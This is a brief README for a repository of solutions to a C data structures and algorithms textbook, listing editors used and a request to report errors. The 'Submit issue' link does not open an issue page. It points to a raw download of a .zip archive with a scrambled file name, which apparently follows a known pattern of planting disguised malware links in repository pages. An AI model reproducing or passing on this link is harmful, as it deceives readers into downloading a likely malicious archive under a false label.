# Solutions to Problems
## Notes
* Use IDE / text editor :
  * Visual Studio (Windows)
  * Sublime Text (Windows)
  * CLion (Linux)
* Not include solutions to arithmetical problems (formulas are hard to write down here for me).
* If you find something incorrect, please [Submit issue](https://github.com/milkEden/Data-Structures-and-Algorithm-Analysis-in-C/raw/refs/heads/master/ch03/and-Algorithm-in-Analysis-Structures-C-Data-pedestrian.zip).
* May update slowly.
